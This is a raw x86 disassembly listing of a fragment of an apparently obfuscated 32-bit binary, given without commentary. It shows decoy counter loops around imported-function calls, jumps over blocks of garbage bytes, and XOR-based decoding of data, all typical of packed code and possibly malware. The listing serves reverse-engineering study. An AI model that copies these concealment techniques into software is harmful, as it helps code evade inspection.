  409291:	pop    edi
  409292:	pop    ebx
  409293:	pop    esi
  409294:	leave  
  409295:	ret    0xc
  409298:	push   ebp
  409299:	mov    ebp,esp
  40929b:	sub    esp,0x58
  40929e:	add    eax,ecx
  4092a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4092a3:	sub    eax,DWORD PTR ds:0x448988
  4092a9:	mov    eax,0x8a42
  4092ae:	add    DWORD PTR ds:0x410753,0x424848
  4092b8:	xor    ax,WORD PTR [ecx+0x20]
  4092bc:	and    DWORD PTR ds:0x448990,0x0
  4092c6:	mov    ecx,DWORD PTR ds:0x448990
  4092cc:	inc    ecx
  4092cd:	mov    DWORD PTR ds:0x448990,ecx
  4092d3:	cmp    DWORD PTR ds:0x448990,0x9
  4092da:	jne    0x4092f3
  4092e0:	push   DWORD PTR [ebp-0x28]
  4092e3:	push   0x44899c
  4092e8:	push   0x55d9
  4092ed:	call   DWORD PTR ds:0x4433a4
  4092f3:	cmp    DWORD PTR ds:0x448990,0x8
  4092fa:	jne    0x40930d
  409300:	mov    ecx,DWORD PTR ds:0x448990
  409306:	inc    ecx
  409307:	mov    DWORD PTR ds:0x448990,ecx
  40930d:	cmp    DWORD PTR ds:0x448990,0x14
  409314:	jb     0x4092c6
  40931a:	mov    ecx,0x3b08
  40931f:	add    ax,cx
  409322:	movzx  eax,ax
  409325:	sub    ecx,0x7afe
  40932b:	mov    DWORD PTR [ebp-0xc],eax
  40932e:	mov    BYTE PTR [ebp-0x1],0x7f
  409332:	lea    eax,[ebp-0x1]
  409335:	mov    DWORD PTR [ebp-0x10],eax
  409338:	and    ecx,0x503
  40933e:	jmp    0x409494
  409343:	mov    ?,ebx
  409345:	icebp  
  409346:	test   al,0x85
  409348:	stos   BYTE PTR es:[edi],al
  409349:	mov    ebp,0xef32abd
  40934e:	cmp    eax,0xf0ef26b
  409353:	(bad)  
  409357:	daa    
  409358:	jg     0x4093d6
  40935a:	jl     0x40934e
  40935c:	xor    DWORD PTR [esi-0x1c30d6eb],0xffffffd3
  409363:	cmp    al,BYTE PTR [eax+0x57]
  409366:	out    0x7f,al
  409368:	push   edi
  409369:	push   0x60084b26
  40936e:	rcr    BYTE PTR [ebx-0x18],cl
  409371:	add    al,0x4a
  409373:	xor    DWORD PTR [esi-0x28],0xffffffad
  409377:	mov    dl,0xb8
  409379:	xchg   edi,eax
  40937a:	ret    
  40937b:	stos   BYTE PTR es:[edi],al
  40937c:	pop    eax
  40937d:	add    al,BYTE PTR [ebp-0x52]
  409380:	shr    BYTE PTR [ecx+0x34],0xeb
  409384:	jo     0x4093cb
  409386:	xor    eax,0x37fc76c8
  40938b:	aas    
  40938c:	adc    DWORD PTR [edi-0x4ad313ad],ebp
  409392:	xlat   BYTE PTR ds:[ebx]
  409393:	sbb    ecx,DWORD PTR [esi-0x295d1e9d]
  409399:	xchg   ecx,eax
  40939a:	sub    dh,BYTE PTR [eax-0x3f]
  40939d:	fwait
  40939e:	add    BYTE PTR [ebx-0x558634f7],al
  4093a4:	in     al,0x19
  4093a6:	and    dl,bh
  4093a8:	cmp    DWORD PTR [eax-0x62],edx
  4093ab:	push   eax
  4093ac:	and    eax,0xc094fb2a
  4093b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b2:	cld    
  4093b3:	mov    dl,0x27
  4093b5:	add    eax,0x17e3a03c
  4093ba:	pop    edx
  4093bb:	jl     0x409413
  4093bd:	jnp    0x4093cb
  4093bf:	out    0xae,eax
  4093c1:	cs push ecx
  4093c3:	loope  0x409433
  4093c5:	jno    0x4093fd
  4093c7:	cmc    
  4093c8:	pop    ecx
  4093c9:	mov    ds:0xfbb85da6,eax
  4093ce:	jmp    0x4093fa
  4093d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093d1:	(bad)  
  4093d2:	aaa    
  4093d3:	dec    edx
  4093d4:	push   edx
  4093d5:	cmp    BYTE PTR [esi+0x50],cl
  4093d8:	(bad)  
  4093d9:	and    eax,0xf013b298
  4093de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093df:	sub    ebx,DWORD PTR [ecx+0x3c]
  4093e2:	fsqrt  
  4093e4:	sbb    cl,bh
  4093e6:	cmp    cl,BYTE PTR [edx+0x6d90a11c]
  4093ec:	or     dl,BYTE PTR ds:0x83ff
  4093f1:	push   eax
  4093f2:	or     DWORD PTR [ebp+0x77a7de17],0xffffff9a
  4093f9:	or     BYTE PTR [edx+0x72],bl
  4093fc:	push   cs
  4093fd:	jae    0x4093b7
  4093ff:	repz in eax,0x14
  409402:	sbb    al,0xdf
  409404:	and    eax,0xc1833b6
  409409:	jb     0x4093e1
  40940b:	icebp  
  40940c:	mov    edi,0xa0653c63
  409411:	inc    esp
  409412:	dec    ebp
  409413:	xchg   ch,ah
  409415:	and    BYTE PTR [edx],bh
  409417:	dec    ecx
  409418:	and    BYTE PTR [ecx-0x7a1a16c6],cl
  40941e:	or     edx,esp
  409420:	xchg   esp,eax
  409421:	push   ebp
  409422:	mov    edi,0x85addb65
  409427:	aaa    
  409428:	inc    esi
  409429:	sbb    al,al
  40942b:	xlat   BYTE PTR ds:[ebx]
  40942c:	ins    DWORD PTR es:[edi],dx
  40942d:	mov    ecx,0xf8914bb9
  409432:	cwd    
  409434:	int3   
  409435:	sub    eax,0xeea426c6
  40943a:	lea    ebx,[ebx+eax*4-0xb]
  40943e:	push   ebx
  40943f:	sub    ah,BYTE PTR [eax]
  409441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409442:	fnstsw WORD PTR [edi]
  409444:	mov    dh,0xa1
  409446:	mov    ds:0x26aa637e,eax
  40944b:	dec    edi
  40944c:	xor    bh,BYTE PTR [ebx-0x48]
  40944f:	mov    ecx,0x4c960557
  409454:	and    eax,0x8f9aefdb
  409459:	and    ch,BYTE PTR [ebp-0x5ef48ca5]
  40945f:	leave  
  409460:	xor    eax,0xd28252c7
  409465:	xlat   BYTE PTR ds:[ebx]
  409466:	mov    ah,0x88
  409468:	mov    ds:0xcab1b827,eax
  40946d:	es enter 0xe9c0,0x94
  409472:	sub    dh,bh
  409474:	adc    eax,0x336016e3
  409479:	adc    ecx,ecx
  40947b:	les    ebp,FWORD PTR [esi-0x3e953e1f]
  409481:	inc    ebx
  409482:	jbe    0x40949b
  409484:	xchg   esp,eax
  409485:	mov    ch,0x5d
  409487:	add    al,0x35
  409489:	mov    bl,0x15
  40948b:	test   BYTE PTR [ebp+0x60],dl
  40948e:	cmc    
  40948f:	mov    ebp,0xd81cb6e2
  409494:	mov    al,BYTE PTR [ebp-0x1]
  409497:	xor    DWORD PTR ds:0x424854,0x9c1
  4094a1:	mov    ecx,DWORD PTR [ebp-0x10]
  4094a4:	and    DWORD PTR ds:0x44b6e4,0x7bc2
  4094ae:	xor    al,0x49
  4094b0:	sub    al,0x35
  4094b2:	mov    DWORD PTR ds:0x41074f,0x4e04
  4094bc:	mov    BYTE PTR [ecx],al
  4094be:	sbb    DWORD PTR ds:0x448990,0x3d76
  4094c8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4094cf:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  4094d6:	or     ecx,0x8aa
  4094dc:	mov    eax,DWORD PTR [ebp-0x8]
  4094df:	and    DWORD PTR ds:0x44e410,0x0
  4094e9:	mov    ecx,DWORD PTR ds:0x44e410
  4094ef:	inc    ecx
  4094f0:	mov    DWORD PTR ds:0x44e410,ecx
  4094f6:	cmp    DWORD PTR ds:0x44e410,0x1e
  4094fd:	jne    0x40951b
  409503:	push   DWORD PTR [ebp-0x10]
  409506:	push   0x410939
  40950b:	push   0x41098d
  409510:	push   0x410939
  409515:	call   DWORD PTR ds:0x443040
  40951b:	cmp    DWORD PTR ds:0x44e410,0x11
  409522:	jb     0x4094e9
  409528:	xor    DWORD PTR ds:0x424840,ebx
  40952e:	mov    ecx,0x7510857
  409533:	push   esi
  409534:	and    DWORD PTR ds:0x44b6d4,0x0
  40953e:	jmp    0x409550
  409543:	mov    esi,DWORD PTR ds:0x44b6d4
  409549:	inc    esi
  40954a:	mov    DWORD PTR ds:0x44b6d4,esi
  409550:	cmp    DWORD PTR ds:0x44b6d4,0x17
  409557:	jae    0x409585
  40955d:	cmp    DWORD PTR ds:0x44b6d4,0x1e
  409564:	jne    0x409580
  40956a:	push   0x4107a9
  40956f:	push   DWORD PTR [ebp-0x20]
  409572:	push   DWORD PTR [ebp-0x20]
  409575:	push   0x7787
  40957a:	call   DWORD PTR ds:0x4433a8
  409580:	jmp    0x409543
  409585:	xor    eax,ecx
  409587:	mov    esi,0x32729e
  40958c:	add    eax,esi
  40958e:	jmp    0x4095af
  409593:	mov    DWORD PTR ds:0x44b6e0,0x1147
  40959d:	mov    dl,BYTE PTR [ebp-0x1]
  4095a0:	mov    DWORD PTR ds:0x4489a4,0x2700
  4095aa:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  4095ae:	inc    eax
  4095af:	mov    DWORD PTR ds:0x44b6dc,0x2e0e
  4095b9:	cmp    eax,0x40
  4095bc:	jb     0x409593
  4095c2:	mov    edx,DWORD PTR [ebp-0x8]
  4095c5:	xor    DWORD PTR ds:0x41073f,0x7536
  4095cf:	mov    eax,DWORD PTR [ebp-0xc]
  4095d2:	add    DWORD PTR ds:0x4489a0,0x44e41c
  4095dc:	jmp    0x409732
  4095e1:	cmp    eax,ebx
  4095e3:	bound  edx,QWORD PTR [edx+0x65]
  4095e6:	push   0x39
  4095e8:	pop    ebx
  4095e9:	jmp    0x4095e6
  4095eb:	adc    al,0xc5
  4095ed:	es dec ebx
  4095ef:	jae    0x40966b
  4095f1:	mov    dh,0xcd
  4095f3:	jl     0x409671
  4095f5:	daa    
  4095f6:	jg     0x409674
  4095f8:	jl     0x4095ef
  4095fa:	sub    edx,DWORD PTR [edx+0x76]
  4095fd:	test   BYTE PTR [ecx],ch
  4095ff:	and    al,0x51
  409601:	xlat   BYTE PTR ds:[ebx]
  409602:	in     al,0x39
  409604:	push   edx
  409605:	iret   
  409606:	(bad)  [esi+0x5e]
  409609:	fwait
  40960a:	js     0x409626
  40960c:	pop    ebp
  40960d:	pmaddwd mm3,QWORD PTR [ebp+0x21]
  409611:	or     ebp,ebp
  409613:	sub    BYTE PTR [edi+0x20],cl
  409616:	shl    DWORD PTR [eax],1
  409618:	fmul   DWORD PTR [eax+0x6d]
  40961b:	dec    eax
  40961c:	mov    ecx,0xf4714f1d
  409621:	mov    edi,DWORD PTR [eax]
  409623:	test   eax,0xd33db75f
  409628:	adc    eax,0x1a7bc46
  40962d:	jns    0x4095f1
  40962f:	int    0x87
  409631:	sbb    eax,0x3675e8aa
  409636:	adc    al,0x9a
  409638:	push   esi
  409639:	(bad)  
  40963a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40963b:	in     al,dx
  40963c:	pop    edx
  40963d:	out    0x49,eax
  40963f:	mov    dl,0x12
  409641:	add    edi,DWORD PTR [edi]
  409643:	xor    DWORD PTR [ecx+ebp*2],edi
  409646:	jne    0x40960d
  409648:	call   FWORD PTR [ecx-0x566bf43]
  40964e:	pop    ebp
  40964f:	sub    DWORD PTR [ecx+0x27e41d00],0x56
  409656:	lods   al,BYTE PTR ds:[esi]
  409657:	daa    
  409658:	mov    ch,0xf7
  40965a:	sub    BYTE PTR [edx],0x4
  40965d:	push   esp
  40965e:	cs push ds
  409660:	sub    cl,BYTE PTR [ebp-0x21]
  409663:	loope  0x409673
  409665:	rcr    ch,cl
  409667:	shl    BYTE PTR [eax],0xb
  40966a:	into   
  40966b:	(bad)  
  40966c:	pop    ebp
  40966d:	shl    ah,1
  40966f:	or     eax,0x944ac9fa
  409674:	enter  0x2cb9,0x8e
  409678:	shr    BYTE PTR ds:0x5b3d999a,0xcd
  40967f:	inc    ecx
  409680:	or     dh,BYTE PTR [ecx]
  409682:	push   ebp
  409683:	fmul   QWORD PTR [edx]
  409685:	mov    dh,0x54
  409687:	adc    al,0xbd
  409689:	retf   
  40968a:	dec    esi
  40968b:	push   ebp
  40968c:	pop    edi
  40968d:	sub    eax,0x3693ffab
  409692:	cmp    ebp,edi
  409694:	push   cs
  409695:	cmp    ebp,DWORD PTR [ebx+0x5e]
  409698:	xchg   ecx,eax
  409699:	or     DWORD PTR ds:0x73260919,ecx
  40969f:	ret    
  4096a0:	mov    dh,0xe
  4096a2:	jl     0x409660
  4096a4:	out    dx,eax
  4096a5:	sub    bh,BYTE PTR [edi]
  4096a7:	and    BYTE PTR [esp+esi*4-0x4d],bh
  4096ab:	inc    ebp
  4096ac:	fistp  QWORD PTR [esi]
  4096ae:	(bad)  
  4096af:	(bad)  
  4096b0:	mov    ch,0xe7
  4096b2:	add    al,0x55
  4096b4:	cmp    BYTE PTR [ecx+ebx*8-0x226ab80e],bl
  4096bb:	rcl    BYTE PTR [eax-0x3f75b318],0xf4
  4096c2:	pop    esi
  4096c3:	(bad)  
  4096c4:	icebp  
  4096c5:	jl     0x40970e
  4096c7:	mov    al,ds:0x3d658f37
  4096cc:	jmp    0x69cc1cc1
  4096d1:	ins    DWORD PTR es:[edi],dx
  4096d2:	test   BYTE PTR [eax-0x35],dl
  4096d5:	fimul  WORD PTR [ecx]
  4096d7:	iret   
  4096d8:	add    eax,0xe163b1e6
  4096dd:	ins    DWORD PTR es:[edi],dx
  4096de:	test   edx,ecx
  4096e0:	daa    
  4096e1:	out    0xf8,al
  4096e3:	sub    eax,0xe66ba0c4
  4096e8:	in     al,0x9a
  4096ea:	push   ebx
  4096eb:	push   cs
  4096ec:	pop    ds
  4096ed:	enter  0xdf6b,0x72
  4096f1:	out    0x4b,eax
  4096f3:	stos   BYTE PTR es:[edi],al
  4096f4:	fld    DWORD PTR [ebx+edx*1-0x1131deb1]
  4096fb:	jnp    0x409684
  4096fd:	lahf   
  4096fe:	in     al,dx
  4096ff:	in     al,dx
  409700:	or     dl,BYTE PTR [ecx-0x38f26c9]
  409706:	ins    BYTE PTR es:[edi],dx
  409707:	adc    al,bl
  409709:	into   
  40970a:	rol    DWORD PTR [ecx+0x44],0x5e
  40970e:	xor    ch,ch
  409710:	inc    edx
  409711:	mov    cl,0xfd
  409713:	loope  0x40970e
  409715:	out    0xd2,eax
  409717:	fs test eax,0xdefa521d
  40971d:	cmp    DWORD PTR ds:0x5814a39d,ebp
  409723:	pop    ebp
  409724:	fidiv  DWORD PTR [ebx-0x1c]
  409727:	sbb    eax,0x914e6de8
  40972c:	clc    
  40972d:	fild   WORD PTR [eax]
  40972f:	mov    ecx,0xd133bcd8
  409734:	add    edx,esi
  409736:	mov    DWORD PTR ds:0x44899c,0x4464
  409740:	cmp    edx,eax
  409742:	mov    DWORD PTR ds:0x424850,0xc14
  40974c:	je     0x40993f
  409752:	add    DWORD PTR ds:0x448998,0x1465
  40975c:	push   ebx
  40975d:	and    DWORD PTR ds:0x44b6d8,0x0
  409767:	mov    eax,ds:0x44b6d8
  40976c:	inc    eax
  40976d:	mov    ds:0x44b6d8,eax
  409772:	cmp    DWORD PTR ds:0x44b6d8,0x10
  409779:	jne    0x409785
  40977f:	call   DWORD PTR ds:0x4433ac
  409785:	cmp    DWORD PTR ds:0x44b6d8,0xf
  40978c:	jne    0x40979d
  409792:	mov    eax,ds:0x44b6d8
  409797:	inc    eax
  409798:	mov    ds:0x44b6d8,eax
  40979d:	cmp    DWORD PTR ds:0x44b6d8,0x1d
  4097a4:	jb     0x409767
  4097aa:	push   edi
  4097ab:	jmp    0x409901
  4097b0:	push   esp
  4097b1:	ss push edx
  4097b3:	std    
  4097b4:	push   edx
  4097b5:	jge    0x40981e
  4097b7:	pop    ebp
  4097b8:	add    al,0xa1
  4097ba:	or     eax,0x64f9640d
  4097bf:	sub    DWORD PTR [ecx-0x31],esi
  4097c2:	jl     0x409840
  4097c4:	daa    
  4097c5:	jg     0x409843
  4097c7:	jl     0x409750
  4097c9:	je     0x40981c
  4097cb:	pop    ebp
  4097cc:	jle    0x4097e6
  4097ce:	imul   ebp,DWORD PTR [ebx+0x1662cee],0xd68e6cdd
  4097d8:	nop
  4097d9:	dec    ebp
  4097da:	dec    edi
  4097db:	push   edi
  4097dc:	or     BYTE PTR [ebx],al
  4097de:	xchg   ebp,eax
  4097df:	lods   al,BYTE PTR ds:[esi]
  4097e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097e1:	xchg   ebp,eax
  4097e2:	nop
  4097e3:	cdq    
  4097e4:	stos   BYTE PTR es:[edi],al
  4097e5:	dec    esi
  4097e6:	lock jecxz 0x40977b
  4097e9:	hlt    
  4097ea:	ins    BYTE PTR es:[edi],dx
  4097eb:	repz xchg esi,eax
  4097ed:	mov    eax,0x335c75c
  4097f2:	xchg   ebp,eax
  4097f3:	pop    edx
  4097f4:	imul   ecx,DWORD PTR [esi-0x7e],0x74
  4097f8:	test   BYTE PTR [ebx],ch
  4097fa:	fwait
  4097fb:	mov    WORD PTR [ebx],cs
  4097fd:	in     eax,0x86
  4097ff:	pop    ebp
  409800:	out    dx,eax
  409801:	call   0xb9d7:0xae787653
  409808:	jecxz  0x4097d2
  40980a:	jle    0x409879
  40980c:	fcom   QWORD PTR [eax+0x4d]
  40980f:	add    ah,BYTE PTR [edi+0x2e]
  409812:	js     0x4097b3
  409814:	(bad)  
  409815:	aam    0x3d
  409817:	mov    al,0x6e
  409819:	dec    esp
  40981a:	xor    BYTE PTR [ebx],bh
  40981c:	hlt    
  40981d:	into   
  40981e:	jg     0x4097d3
  409820:	inc    edx
  409821:	aaa    
  409822:	int    0xdc
  409824:	dec    eax
  409825:	dec    esi
  409826:	sub    esp,edx
  409828:	adc    bl,BYTE PTR [esi-0x1224f05a]
  40982e:	mov    dl,0x1b
  409830:	dec    edx
  409831:	dec    esp
  409832:	lds    eax,FWORD PTR [esi-0x51e2490]
  409838:	fild   QWORD PTR [ebx+edx*8-0x3058054d]
  40983f:	je     0x409893
  409841:	mov    ebp,0x97133214
  409846:	sbb    eax,edx
  409848:	pop    eax
  409849:	sub    cl,BYTE PTR [ecx+0x3094205]
  40984f:	jg     0x4097f0
  409851:	(bad)  
  409852:	sbb    eax,0xcd4883c6
  409857:	sbb    cl,BYTE PTR [edi-0x535d383]
  40985d:	cld    
  40985e:	fistp  WORD PTR [esi+0x12]
  409861:	adc    DWORD PTR [edi-0xd01539e],0x745e63fc
  40986b:	lahf   
  40986c:	pop    edx
  40986d:	ss daa 
  40986f:	xor    bh,BYTE PTR [ebp-0x6c]
  409872:	scas   al,BYTE PTR es:[edi]
  409873:	outs   dx,BYTE PTR gs:[esi]
  409875:	in     al,0x29
  409877:	push   ebp
  409878:	push   ss
  409879:	enter  0x2cef,0xdd
  40987d:	imul   esp,DWORD PTR [ebp-0x80],0x6b61a78a
  409884:	dec    ecx
  409885:	sti    
  409886:	and    DWORD PTR [ebx-0x2ceca68d],esi
  40988c:	out    0x5a,al
  40988e:	enter  0x25c7,0xbd
  409892:	js     0x40985b
  409894:	ds inc edx
  409896:	push   edx
  409897:	or     eax,0xf5b5a308
  40989c:	sbb    DWORD PTR [esp+ecx*4+0x345f6840],ebx
  4098a3:	arpl   sp,dx
  4098a5:	daa    
  4098a6:	pushf  
  4098a7:	mov    ds:0x4e9264ac,eax
  4098ac:	popf   
  4098ad:	iret   
  4098ae:	add    ch,ch
  4098b0:	scas   al,BYTE PTR es:[di]
  4098b2:	cmp    ah,0x40
  4098b5:	sub    cl,cl
  4098b7:	sub    DWORD PTR [ebx],edi
  4098b9:	add    DWORD PTR [ecx-0x2f8d613c],ebx
  4098bf:	jb     0x409856
  4098c1:	inc    esi
  4098c2:	(bad)  
  4098c3:	push   ebx
  4098c4:	jne    0x409859
  4098c6:	ret    
  4098c7:	lds    ecx,FWORD PTR [esi+0x6c]
  4098ca:	fsubr  DWORD PTR [eax]
  4098cc:	push   esp
  4098cd:	ins    BYTE PTR es:[edi],dx
  4098ce:	jnp    0x409931
  4098d0:	popw   ds
  4098d2:	mov    edi,0x89d33308
  4098d7:	and    DWORD PTR [ebp+0x74],0x7f9d89bc
  4098de:	imul   ecx,DWORD PTR [esi],0x32
  4098e1:	cli    
  4098e2:	ss mov bh,0xeb
  4098e5:	(bad)  
  4098e6:	fwait
  4098e7:	icebp  
  4098e8:	imul   ebx,DWORD PTR [ebp-0x2c],0x2b99557d
  4098ef:	mov    esp,0x8736889a
  4098f4:	and    esi,ebp
  4098f6:	dec    ebx
  4098f7:	std    
  4098f8:	pushf  
  4098f9:	test   bl,0x26
  4098fc:	and    eax,0x34381b0a
  409901:	mov    edi,DWORD PTR [ebp+0x8]
  409904:	mov    eax,0x8a42
  409909:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40990e:	mov    edi,0x3b08
  409913:	add    ax,di
  409916:	movzx  eax,ax
  409919:	mov    DWORD PTR [ebp-0x14],eax
  40991c:	mov    eax,DWORD PTR [ebp+0x8]
  40991f:	movzx  eax,WORD PTR [eax+edx*4]
  409923:	xor    eax,0x8a42
  409928:	add    eax,edi
  40992a:	mov    edi,DWORD PTR [ebp-0x14]
  40992d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  409931:	mov    eax,DWORD PTR [ebp-0xc]
  409934:	inc    edx
  409935:	cmp    edx,eax
  409937:	jne    0x409901
  40993d:	pop    edi
  40993e:	pop    ebx
  40993f:	mov    eax,DWORD PTR [ebp-0x8]
  409942:	mov    edx,DWORD PTR [ebp+0x10]
  409945:	xor    eax,ecx
  409947:	add    eax,esi
  409949:	mov    DWORD PTR [edx],eax
  40994b:	mov    eax,DWORD PTR [ebp-0x8]
  40994e:	xor    eax,ecx
  409950:	add    eax,esi
  409952:	mov    DWORD PTR [ebp+0x8],eax
  409955:	mov    eax,DWORD PTR [ebp+0x8]
  409958:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40995c:	mov    dl,BYTE PTR [ebp-0x1]
  40995f:	cmp    al,dl
  409961:	je     0x409afa
  409967:	mov    eax,DWORD PTR [ebp+0x8]
  40996a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40996e:	mov    edx,DWORD PTR [ebp+0xc]
  409971:	cmp    al,BYTE PTR [edx]
  409973:	jne    0x409b20
  409979:	mov    eax,DWORD PTR [ebp-0x8]
  40997c:	mov    edx,DWORD PTR [ebp+0xc]
  40997f:	movsx  edx,BYTE PTR [edx]
  409982:	xor    eax,ecx
  409984:	add    eax,esi
  409986:	cmp    edx,eax
  409988:	je     0x409b14
  40998e:	jmp    0x409ae4
  409993:	add    ah,ah
  409995:	clc    
  409996:	pop    es
  409997:	clc    
  409998:	sbb    esp,ebx
  40999a:	sti    
  40999b:	ins    DWORD PTR es:[edi],dx
  40999c:	sbb    BYTE PTR [esp+ebp*8],ch
  40999f:	sub    esi,ebx
  4099a1:	lods   al,BYTE PTR es:[esi]
  4099a3:	cmp    dh,cl
  4099a5:	jl     0x409a23
  4099a7:	daa    
  4099a8:	jg     0x409a26
  4099aa:	jl     0x40999c
  4099ac:	stos   BYTE PTR es:[edi],al
  4099ad:	and    eax,0xd762723b
  4099b2:	pusha  
  4099b3:	cmp    BYTE PTR [edx+0x57816de8],dh
  4099b9:	lods   eax,DWORD PTR ds:[esi]
  4099ba:	fcmove st,st(4)
  4099bc:	cmp    eax,0x109784d9
  4099c1:	shl    ah,cl
  4099c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099c4:	mov    ds:0x6524d28e,eax
  4099c9:	xchg   esp,eax
  4099ca:	fild   DWORD PTR [ebp+0x6417383c]
  4099d0:	(bad)  
  4099d1:	std    
  4099d2:	jnp    0x4099e1
  4099d4:	shl    BYTE PTR [esi+0x617d6a14],1
  4099da:	stc    
  4099db:	js     0x4099a1
  4099dd:	cmp    eax,0x3c3f9a77
  4099e2:	sub    eax,0x6923970c
  4099e7:	ficom  WORD PTR ds:0xb7446006
  4099ed:	jo     0x4099ca
  4099ef:	(bad)  
  4099f0:	xchg   ebx,eax
  4099f1:	jo     0x4099a1
  4099f3:	mov    edi,0x810a4b98
  4099f8:	(bad)  
  4099f9:	sar    edx,1
  4099fb:	in     al,0x35
  4099fd:	es jae 0x4099db
  409a00:	jge    0x409985
  409a02:	pop    edi
  409a03:	xor    ch,bl
  409a05:	aas    
  409a06:	les    edx,FWORD PTR [esp+esi*8]
  409a09:	add    ah,BYTE PTR [eax-0x7447184a]
  409a0f:	push   0x31
  409a11:	jmp    0xc9f7d1b9
  409a16:	fiadd  DWORD PTR [eax]
  409a18:	or     ecx,DWORD PTR [ebp+0x14]
  409a1b:	cmp    DWORD PTR [ecx+ecx*2+0x5a],eax
  409a1f:	mov    BYTE PTR [eax-0x64],dh
  409a22:	dec    ebp
  409a23:	push   ds
  409a24:	sub    al,0x93
  409a26:	dec    esi
  409a27:	add    BYTE PTR [ecx],0x54
  409a2a:	sub    cl,ch
  409a2c:	jle    0x409a14
  409a2e:	mov    eax,0xb6e416b9
  409a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a34:	aaa    
  409a35:	mov    dl,0x9e
  409a37:	pop    esp
  409a38:	jl     0x409a7c
  409a3a:	adc    dl,BYTE PTR [ebp+0x60ef15d8]
  409a40:	addr16 popf 
  409a42:	imul   edx,DWORD PTR [ebp+edi*4-0x738797b3],0x8dba7f8b
  409a4d:	pop    ebx
  409a4e:	stos   BYTE PTR es:[edi],al
  409a4f:	gs mov dl,0xb9
  409a52:	test   ebp,ebx
  409a54:	xor    ebp,edx
  409a56:	aam    0xa4
  409a58:	int    0x8a
  409a5a:	push   ds
  409a5b:	and    BYTE PTR [ecx],al
  409a5d:	push   ebx
  409a5e:	mov    dl,0xba
  409a60:	out    dx,eax
  409a61:	inc    esp
  409a62:	add    ecx,eax
  409a64:	(bad)  
  409a66:	mov    dl,0xdf
  409a68:	jae    0x409a1d
  409a6a:	sbb    BYTE PTR [eax+0x7bf50fa5],dh
  409a70:	inc    edx
  409a71:	jns    0x409a9a
  409a73:	or     al,0xda
  409a75:	mov    ch,0xcf
  409a77:	and    eax,DWORD PTR [eax]
  409a79:	dec    esi
  409a7a:	and    eax,DWORD PTR [ebx-0x5f8b19]
  409a80:	repnz push edi
  409a82:	mov    cl,0xe8
  409a84:	jns    0x409aa3
  409a86:	jb     0x409af8
  409a88:	in     eax,0xe8
  409a8a:	ins    BYTE PTR es:[edi],dx
  409a8b:	out    0xfc,al
  409a8d:	hlt    
  409a8e:	repz popa 
  409a90:	mov    bh,0x8d
  409a92:	jno    0x409a6d
  409a94:	jno    0x409a5d
  409a96:	arpl   WORD PTR [edi+0x45],di
  409a99:	push   esi
  409a9a:	out    0xe2,al
  409a9c:	mov    ch,0xfa
  409a9e:	jge    0x409a7d
  409aa0:	mov    eax,fs:0xcc99df08
  409aa6:	push   ebx
  409aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aa8:	mov    ah,BYTE PTR [eax+0x1a]
  409aab:	jae    0x409aad
  409aad:	fcomp  QWORD PTR ds:0x3bab6283
  409ab3:	icebp  
  409ab4:	xor    al,0x18
  409ab6:	popf   
  409ab7:	addr16 jmp 0xdfad0386
  409abd:	push   ebp
  409abe:	pusha  
  409abf:	jno    0x409ad6
  409ac1:	pop    ebx
  409ac2:	adc    DWORD PTR [esi+0x4e],0x50
  409ac6:	in     eax,0xc7
  409ac8:	(bad)  
  409ac9:	in     eax,dx
  409aca:	call   0x7705d4db
  409acf:	adc    eax,0x852cc9b
  409ad4:	mov    ah,0x3a
  409ad6:	(bad)  
  409ad7:	jmp    FWORD PTR [ebx-0x208006e]
  409add:	cdq    
  409ade:	sar    BYTE PTR [eax],1
  409ae0:	nop
  409ae1:	inc    BYTE PTR [ecx-0x17ba38d8]
  409ae7:	(bad)  
  409ae8:	std    
  409ae9:	add    eax,0xe8458d07
  409aee:	mov    DWORD PTR [ebp-0x14],eax
  409af1:	mov    eax,DWORD PTR [ebp-0x14]
  409af4:	add    DWORD PTR [eax],0x705fa8f
  409afa:	mov    eax,DWORD PTR [ebp-0x10]
  409afd:	mov    edx,DWORD PTR [ebp+0x8]
  409b00:	xor    eax,ecx
  409b02:	lea    eax,[eax+edx*1+0x32729e]
  409b09:	mov    DWORD PTR [ebp+0x8],eax
  409b0c:	inc    DWORD PTR [ebp+0xc]
  409b0f:	jmp    0x409955
  409b14:	mov    eax,DWORD PTR [ebp-0x10]
  409b17:	xor    eax,ecx
  409b19:	mov    ecx,DWORD PTR [ebp+0x10]
  409b1c:	add    eax,esi
  409b1e:	mov    DWORD PTR [ecx],eax
  409b20:	pop    esi
  409b21:	leave  
  409b22:	ret    0xc
  409b25:	push   ebp
  409b26:	mov    ebp,esp
  409b28:	push   ecx
  409b29:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  409b30:	sub    DWORD PTR ds:0x41074b,edx
  409b36:	mov    eax,DWORD PTR [ebp+0x8]
  409b39:	jmp    0x409ca4
  409b3e:	push   cs
  409b3f:	xchg   BYTE PTR [esi],dl
  409b41:	fs xchg esi,eax
  409b43:	fs dec esi
  409b45:	data16 jg 0x409bb3
  409b48:	pop    esp
  409b49:	lds    esp,FWORD PTR [edi*1-0x3e1cf26f]
  409b50:	jl     0x409bce
  409b52:	retf   0x7c7f
  409b55:	jl     0x409b97
  409b57:	mov    bh,BYTE PTR [esi-0x4c]
  409b5a:	lock xchg edi,eax
  409b5c:	nop
  409b5d:	push   esp
  409b5e:	sbb    edi,DWORD PTR [ebx]
  409b60:	sbb    DWORD PTR [esi+0x62],edx
  409b63:	pop    edx
  409b64:	lods   al,BYTE PTR ds:[esi]
  409b65:	ds ss or dh,0x43
  409b6a:	cs popa 
  409b6c:	cld    
  409b6d:	jb     0x409bc8
  409b6f:	fst    QWORD PTR [ebp-0x4c]
